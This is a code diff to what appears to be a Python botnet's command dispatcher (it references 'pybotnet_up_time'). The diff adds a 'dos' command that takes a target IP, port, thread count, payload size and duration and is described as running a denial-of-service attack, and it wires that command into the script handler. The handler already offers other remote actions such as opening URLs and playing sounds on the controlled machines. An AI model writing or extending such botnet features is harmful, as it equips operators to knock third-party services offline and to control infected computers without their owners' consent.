@@ -53,6 +53,7 @@ scripts_name = {
                         """,
     "playsound":        "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
     "openurl":          "`openurl <url> <how-many-times>` Will open a specified url n times",
+    "dos":             """`dos <target-ip> <target-port> <thread-numbers> <payload-size> <time-in-seconds> Will Run a Denial-Of-Service Attack on target"""
 
 }
 
@@ -171,6 +172,9 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
 
             elif command_name == "openurl":
                 return openurl(logger, command)
+            
+            elif command_name == "dos":
+                return dos(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
